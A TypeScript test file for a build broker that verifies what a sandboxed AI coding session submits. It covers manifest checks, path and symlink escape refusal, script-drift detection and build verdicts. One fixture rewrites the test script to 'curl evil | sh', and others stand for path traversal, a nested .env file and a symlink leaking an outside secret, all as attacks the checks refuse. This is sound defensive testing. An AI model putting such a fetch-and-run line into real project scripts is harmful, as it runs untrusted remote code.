// The broker's pure parts -- manifest verify, caps, verdict assembly, state
// decisions -- plus the in-sandbox MCP (spawned as a real stdio child, no live
// services) and the cross-check that what the jail submits is exactly what the
// host verifies.
import { spawn, type ChildProcessByStdio } from "node:child_process";
import { createHash } from "node:crypto";
import {
  mkdirSync,
  mkdtempSync,
  readFileSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createInterface } from "node:readline";
import type { Readable, Writable } from "node:stream";
import { fileURLToPath } from "node:url";

import { afterAll, beforeAll, describe, expect, it } from "vitest";

import {
  assembleVerdict,
  checkScripts,
  checkShape,
  copyVerified,
  decideBuilding,
  entityBytes,
  lastAssistant,
  parseSubmission,
  sessionTitle,
  sessionUrl,
  statusMarkdown,
  stuckFrom,
  type BuildingObservation,
  type Check,
  type ManifestFile,
} from "./forge-broker.mts";

const BROKER_PATH = fileURLToPath(
  new URL("../../deploy/forge/workspace/.opencode/mcp/broker.mjs", import.meta.url),
);

const LIMITS = { budgetMs: 30 * 60_000, stallMs: 4 * 60_000, retryHoldMs: 5 * 60_000 };
const CAPS = {
  maxFiles: 500,
  maxFileBytes: 10 * 1024 * 1024,
  maxTotalBytes: 200 * 1024 * 1024,
  maxEntityBytes: 100 * 1024 * 1024,
};

const sha = (body: string | Buffer) => createHash("sha256").update(body).digest("hex");

const PKG = JSON.stringify({
  name: "scene",
  scripts: { test: "vitest run", build: "sdk-commands build" },
  devDependencies: { "@dcl/sdk-commands": "1.0.0", vitest: "4.1.10" },
});

function file(path: string, body: string): ManifestFile {
  return { path, sha256: sha(body), bytes: Buffer.byteLength(body) };
}

function goodManifest(): { files: ManifestFile[]; bodies: Record<string, string> } {
  const bodies: Record<string, string> = {
    "package.json": PKG,
    "scene.json": '{"main":"bin/game.js"}',
    "BUILD.md": "# built\n",
    "src/index.ts": "export {};\n",
  };
  return { files: Object.entries(bodies).map(([p, b]) => file(p, b)), bodies };
}

function writeTree(root: string, bodies: Record<string, string>): void {
  for (const [path, body] of Object.entries(bodies)) {
    const abs = join(root, path);
    mkdirSync(join(abs, ".."), { recursive: true });
    writeFileSync(abs, body);
  }
}

describe("parseSubmission", () => {
  const raw = (over: Record<string, unknown> = {}) => ({
    slug: "zoo",
    submitted: "2026-08-22T00:00:00.000Z",
    tests: "vitest run \u{2014} 3 passed",
    files: goodManifest().files,
    ...over,
  });

  it("accepts the shape the MCP writes", () => {
    const { submission, problems } = parseSubmission(raw(), "zoo");
    expect(problems).toEqual([]);
    expect(submission?.fileCount).toBe(4);
    expect(submission?.totalBytes).toBeGreaterThan(0);
  });

  it("refuses a slug mismatch", () => {
    const { submission, problems } = parseSubmission(raw({ slug: "other" }), "zoo");
    expect(submission).toBeNull();
    expect(problems.join(" ")).toContain('names slug "other"');
  });

  it("refuses a missing test claim and a malformed manifest entry", () => {
    const { problems } = parseSubmission(
      raw({ tests: " ", files: [{ path: "x", sha256: "nope", bytes: 1 }] }),
      "zoo",
    );
    expect(problems.join(" ")).toContain("no test claim");
    expect(problems.join(" ")).toContain("entry 1 is malformed");
  });

  it("refuses non-objects and empty manifests", () => {
    expect(parseSubmission(null, "zoo").problems.length).toBeGreaterThan(0);
    expect(parseSubmission(raw({ files: [] }), "zoo").problems.join(" ")).toContain("no file manifest");
  });
});

describe("checkShape", () => {
  it("passes the template shape", () => {
    expect(checkShape(goodManifest().files, CAPS)).toEqual([]);
  });

  it("names files outside the scene shape", () => {
    const files = [...goodManifest().files, file("deploy.sh", "x"), file("evil/x.ts", "x")];
    const problems = checkShape(files, CAPS).join(" ");
    expect(problems).toContain('"deploy.sh" is outside the scene shape');
    expect(problems).toContain('"evil/x.ts" is outside the scene shape');
  });

  it("refuses traversal, backslashes and nested dotfiles", () => {
    const files = [
      ...goodManifest().files,
      file("src/../../escape.ts", "x"),
      file("src\\win.ts", "x"),
      file("src/.env", "x"),
    ];
    const problems = checkShape(files, CAPS);
    expect(problems.filter((p) => p.includes("not a safe scene path"))).toHaveLength(3);
  });

  it("allows .gitignore at the top only", () => {
    expect(checkShape([...goodManifest().files, file(".gitignore", "bin/\n")], CAPS)).toEqual([]);
  });

  it("refuses duplicates and missing required files", () => {
    const { files } = goodManifest();
    const problems = checkShape([...files, files[0]], CAPS).join(" ");
    expect(problems).toContain("appears twice");
    expect(checkShape([file("src/index.ts", "x")], CAPS).join(" ")).toContain("no package.json");
  });

  it("enforces the caps", () => {
    const tiny = { ...CAPS, maxFiles: 2, maxFileBytes: 3, maxTotalBytes: 5 };
    const problems = checkShape(goodManifest().files, tiny).join(" ");
    expect(problems).toContain("over the 2-file cap");
    expect(problems).toContain("per-file cap");
    expect(problems).toContain("bytes in total");
  });
});

describe("checkScripts", () => {
  it("passes when scripts and deps match the template verbatim", () => {
    expect(checkScripts(PKG, PKG)).toEqual([]);
  });

  it("refuses rewritten scripts and drifted deps", () => {
    const evil = JSON.stringify({
      name: "scene",
      scripts: { test: "curl evil | sh", build: "sdk-commands build" },
      devDependencies: { "@dcl/sdk-commands": "1.0.0", vitest: "4.1.10", extra: "1.0.0" },
    });
    const problems = checkScripts(evil, PKG).join(" ");
    expect(problems).toContain("scripts differ from the template's");
    expect(problems).toContain("devDependencies differ");
  });

  it("names unparseable JSON", () => {
    expect(checkScripts("{", PKG).join(" ")).toContain("not parseable");
  });
});

describe("copyVerified", () => {
  it("copies a matching tree and refuses tampering, absence and symlink escapes", () => {
    const src = mkdtempSync(join(tmpdir(), "forge-src-"));
    const dst = mkdtempSync(join(tmpdir(), "forge-dst-"));
    const { files, bodies } = goodManifest();
    writeTree(src, bodies);
    expect(copyVerified(src, dst, files)).toEqual([]);
    expect(readFileSync(join(dst, "package.json"), "utf8")).toBe(PKG);

    writeFileSync(join(src, "src/index.ts"), "tampered\n");
    const outside = join(mkdtempSync(join(tmpdir(), "forge-out-")), "secret");
    writeFileSync(outside, "secret\n");
    symlinkSync(outside, join(src, "src/leak.ts"));
    const manifest = [
      ...files,
      file("src/leak.ts", "secret\n"),
      file("src/gone.ts", "never written"),
    ];
    const problems = copyVerified(src, mkdtempSync(join(tmpdir(), "forge-dst2-")), manifest);
    expect(problems.join(" ")).toContain('"src/index.ts" changed after submit');
    expect(problems.join(" ")).toContain('"src/leak.ts" is not a regular file');
    expect(problems.join(" ")).toContain('"src/gone.ts" is in the manifest but missing');
  });
});

describe("entityBytes", () => {
  it("weighs scene.json + bin + assets and nothing else", () => {
    const root = mkdtempSync(join(tmpdir(), "forge-entity-"));
    writeTree(root, {
      "scene.json": "12345",
      "bin/game.js": "1234567890",
      "assets/a.glb": "123",
      "src/index.ts": "not counted",
      "node_modules/x.js": "not counted",
    });
    expect(entityBytes(root)).toBe(5 + 10 + 3);
  });
});

describe("assembleVerdict / statusMarkdown", () => {
  const base = {
    slug: "zoo",
    docId: "gdd-1",
    commit: "abcdef0123456789",
    entityBytes: 42,
    session: { id: "ses_abc123", url: "https://forge.catalyst.example.com/s" },
    checkedAt: "2026-08-22T00:00:00.000Z",
  };

  it("lands when every check passed", () => {
    const checks: Check[] = [{ name: "tests", ok: true, detail: "green" }];
    const v = assembleVerdict({ ...base, checks });
    expect(v.ok).toBe(true);
    expect(v.verdict).toBe("landed");
    expect(v.detail).toBe("commit abcdef0123, tests green \u{2014} /foundry/play/zoo");
    expect(v.playPath).toBe("/foundry/play/zoo");
  });

  it("fails on the first failing check, verbatim", () => {
    const checks: Check[] = [
      { name: "tests", ok: true, detail: "green" },
      { name: "build", ok: false, detail: "npm run build exited 1 \u{2014} boom" },
      { name: "register", ok: false, detail: "later" },
    ];
    const v = assembleVerdict({ ...base, checks, commit: null });
    expect(v.ok).toBe(false);
    expect(v.detail).toBe("build: npm run build exited 1 \u{2014} boom");
    expect(v.playPath).toBeNull();
    const md = statusMarkdown(v);
    expect(md).toContain("# Build \u{2014} zoo");
    expect(md).toContain("- verdict: failed");
    expect(md).toContain("! build \u{2014} npm run build exited 1 \u{2014} boom");
    expect(md).toContain("request the build again");
  });
});

describe("decideBuilding", () => {
  const obs = (over: Partial<BuildingObservation>): BuildingObservation => ({
    elapsedMs: 1_000,
    submitFresh: false,
    buildMd: false,
    assistant: null,
    session: "busy",
    retryAttempt: 0,
    retryMessage: "",
    retryForMs: 0,
    ...over,
  });

  it("verifies on a fresh submission, whatever else is going on", () => {
    expect(
      decideBuilding(
        obs({
          submitFresh: true,
          buildMd: true,
          assistant: { completed: true, errorName: "APIError", errorMessage: "x" },
        }),
        LIMITS,
      ),
    ).toEqual({ kind: "verify" });
  });

  it("waits while the session is busy inside the budget", () => {
    expect(decideBuilding(obs({}), LIMITS)).toEqual({ kind: "wait" });
  });

  it("fails a model error with the error's own name", () => {
    const a = decideBuilding(
      obs({ assistant: { completed: true, errorName: "ContextOverflowError", errorMessage: "too big" } }),
      LIMITS,
    );
    expect(a.kind).toBe("fail");
    if (a.kind === "fail") {
      expect(a.reason).toBe("model-error");
      expect(a.detail).toContain("ContextOverflowError: too big");
    }
  });

  it("holds through a young retry, fails a persistent one with the provider's sentence", () => {
    const young = obs({ session: "retry", retryAttempt: 3, retryMessage: "upstream 503", retryForMs: 60_000 });
    expect(decideBuilding(young, LIMITS)).toEqual({ kind: "wait" });
    const old = { ...young, retryForMs: 6 * 60_000 };
    const a = decideBuilding(old, LIMITS);
    expect(a.kind).toBe("fail");
    if (a.kind === "fail") {
      expect(a.reason).toBe("gateway");
      expect(a.detail).toContain("upstream 503");
    }
  });

  it("fails no-artifact when the turn completed and nothing was submitted", () => {
    const a = decideBuilding(
      obs({ session: "idle", assistant: { completed: true, errorName: null, errorMessage: "" } }),
      LIMITS,
    );
    expect(a.kind).toBe("fail");
    if (a.kind === "fail") expect(a.reason).toBe("no-artifact");
  });

  it("fails timeout past the budget and stalled on a silent idle session", () => {
    const t = decideBuilding(obs({ elapsedMs: LIMITS.budgetMs + 1 }), LIMITS);
    expect(t.kind === "fail" && t.reason).toBe("timeout");
    const s = decideBuilding(obs({ session: "idle", elapsedMs: LIMITS.stallMs + 1 }), LIMITS);
    expect(s.kind === "fail" && s.reason).toBe("stalled");
  });
});

describe("session plumbing helpers", () => {
  it("lastAssistant reads envelopes and bare messages, newest assistant wins", () => {
    expect(lastAssistant([])).toBeNull();
    expect(lastAssistant([{ info: { role: "user" } }])).toBeNull();
    expect(
      lastAssistant([
        { info: { role: "assistant", time: { completed: 1 } } },
        { info: { role: "assistant", time: { created: 2 }, error: { name: "APIError", data: { message: "x" } } } },
        { info: { role: "user" } },
      ]),
    ).toEqual({ completed: false, errorName: "APIError", errorMessage: "x" });
    expect(lastAssistant([{ role: "assistant", time: { completed: 5 } }])).toEqual({
      completed: true,
      errorName: null,
      errorMessage: "",
    });
  });

  it("stuckFrom surfaces only retries at attempt >= 2", () => {
    expect(stuckFrom({})).toBeNull();
    expect(stuckFrom({ a: { type: "retry", attempt: 1 } })).toBeNull();
    expect(stuckFrom({ a: { type: "retry", attempt: 3, message: "503" }, b: { type: "busy" } })).toEqual({
      attempts: 3,
      message: "503",
    });
  });

  it("sessionUrl matches the copilot's b64 shape, null without a public URL", () => {
    expect(sessionUrl(null, "ses_x")).toBeNull();
    const b64 = Buffer.from("https://forge.catalyst.example.com").toString("base64").replace(/=+$/, "");
    expect(sessionUrl("https://forge.catalyst.example.com/", "ses_x")).toBe(
      `https://forge.catalyst.example.com/server/${b64}/session/ses_x`,
    );
  });

  it("sessionTitle is the recovery key", () => {
    expect(sessionTitle("zoo")).toBe("build:zoo \u{2014} broker");
  });
});

// The in-sandbox MCP, spawned for real over stdio.

interface RpcResult {
  result?: { tools?: { name: string }[]; content?: { text: string }[]; isError?: boolean };
  error?: { message: string };
}

describe("broker.mjs (stdio MCP child)", () => {
  let root: string;
  let proc: ChildProcessByStdio<Writable, Readable, null>;
  let call: (method: string, params?: unknown) => Promise<RpcResult>;

  const text = (r: RpcResult) => r.result?.content?.[0]?.text ?? "";

  beforeAll(() => {
    root = mkdtempSync(join(tmpdir(), "forge-jail-"));
    proc = spawn(process.execPath, [BROKER_PATH], {
      env: { ...process.env, FORGE_BROKER_ROOT: root },
      stdio: ["pipe", "pipe", "inherit"],
    });
    const pending = new Map<number, (msg: RpcResult) => void>();
    createInterface({ input: proc.stdout }).on("line", (line) => {
      const msg = JSON.parse(line) as RpcResult & { id: number };
      pending.get(msg.id)?.(msg);
      pending.delete(msg.id);
    });
    let nextId = 1;
    call = (method, params) =>
      new Promise((resolve, reject) => {
        const id = nextId++;
        pending.set(id, resolve);
        proc.stdin.write(JSON.stringify({ jsonrpc: "2.0", id, method, params }) + "\n");
        setTimeout(() => {
          if (pending.delete(id)) reject(new Error(`no reply to ${method}`));
        }, 5_000);
      });
  });

  afterAll(() => {
    proc.kill();
  });

  const tool = (name: string, args: unknown) => call("tools/call", { name, arguments: args });

  it("initializes and lists the two tools", async () => {
    const init = await call("initialize", { protocolVersion: "2024-11-05" });
    expect((init.result as { serverInfo?: { name: string } }).serverInfo?.name).toBe("forge-broker");
    const list = await call("tools/list");
    expect(list.result?.tools?.map((t) => t.name)).toEqual(["submit_build", "poll_submission"]);
  });

  it("refuses a bad slug, a missing tree and a missing BUILD.md, naming the next step", async () => {
    expect(text(await tool("submit_build", { slug: "Bad Slug", tests: "x" }))).toContain("not a build id");
    expect(text(await tool("submit_build", { slug: "zoo", tests: "x" }))).toContain(
      "builds/zoo/ does not exist",
    );
    writeTree(join(root, "builds", "zoo"), goodManifest().bodies);
    const noMd = { ...goodManifest().bodies };
    delete (noMd as Record<string, string>)["BUILD.md"];
    mkdirSync(join(root, "builds", "nomd"), { recursive: true });
    writeTree(join(root, "builds", "nomd"), noMd);
    expect(text(await tool("submit_build", { slug: "nomd", tests: "x" }))).toContain("BUILD.md is missing");
    expect(text(await tool("submit_build", { slug: "zoo", tests: "  " }))).toContain("tests field");
  });

  it("submits a manifest the host verifies verbatim (the cross-check)", async () => {
    // Things that must never be manifested, sitting right in the tree.
    writeTree(join(root, "builds", "zoo"), {
      "node_modules/junk/index.js": "x",
      "bin/game.js": "stale output",
      "dist/x.js": "stale",
    });
    const res = await tool("submit_build", { slug: "zoo", tests: "vitest run \u{2014} 3 passed" });
    expect(res.result?.isError).toBeUndefined();
    expect(text(res)).toContain("SUBMITTED \u{2014} the broker verifies outside the jail");

    const raw = JSON.parse(readFileSync(join(root, "builds", "zoo", "SUBMIT.json"), "utf8"));
    const { submission, problems } = parseSubmission(raw, "zoo");
    expect(problems).toEqual([]);
    const paths = submission!.files.map((f) => f.path);
    expect(paths).toEqual([...paths].sort());
    expect(paths.some((p) => p.startsWith("node_modules") || p.startsWith("bin") || p.startsWith("dist"))).toBe(
      false,
    );
    expect(paths).toContain("BUILD.md");
    expect(paths).not.toContain("SUBMIT.json");
    expect(checkShape(submission!.files, CAPS)).toEqual([]);
    const scratch = mkdtempSync(join(tmpdir(), "forge-verify-"));
    expect(copyVerified(join(root, "builds", "zoo"), scratch, submission!.files)).toEqual([]);
  });

  it("polls PENDING after submit, then reads the broker's verdict, refusing a failed one", async () => {
    expect(text(await tool("poll_submission", { slug: "nomd" }))).toContain("nothing has been submitted");
    expect(text(await tool("poll_submission", { slug: "zoo" }))).toContain("PENDING \u{2014} submitted at");

    const verdict = {
      ok: false,
      detail: "tests: npm test exited 1 \u{2014} boom",
      checks: [{ name: "tests", ok: false, detail: "npm test exited 1 \u{2014} boom" }],
      commit: null,
      playPath: null,
    };
    writeFileSync(join(root, "builds", "zoo", "VERDICT.json"), JSON.stringify(verdict));
    const failed = await tool("poll_submission", { slug: "zoo" });
    expect(failed.result?.isError).toBe(true);
    expect(text(failed)).toContain("FAILED \u{2014} tests: npm test exited 1 \u{2014} boom");
    expect(text(failed)).toContain("submit_build again");

    // A resubmission clears the stale verdict...
    await tool("submit_build", { slug: "zoo", tests: "fixed, vitest run \u{2014} 4 passed" });
    expect(text(await tool("poll_submission", { slug: "zoo" }))).toContain("PENDING");

    // ...and a landed verdict reads back with commit and play path.
    writeFileSync(
      join(root, "builds", "zoo", "VERDICT.json"),
      JSON.stringify({
        ok: true,
        detail: "commit abcdef0123, tests green \u{2014} /foundry/play/zoo",
        checks: [{ name: "tests", ok: true, detail: "green" }],
        commit: "abcdef0123456789",
        playPath: "/foundry/play/zoo",
      }),
    );
    const landed = await tool("poll_submission", { slug: "zoo" });
    expect(landed.result?.isError).toBeUndefined();
    expect(text(landed)).toContain("LANDED");
    expect(text(landed)).toContain("live at /foundry/play/zoo");
  });
});
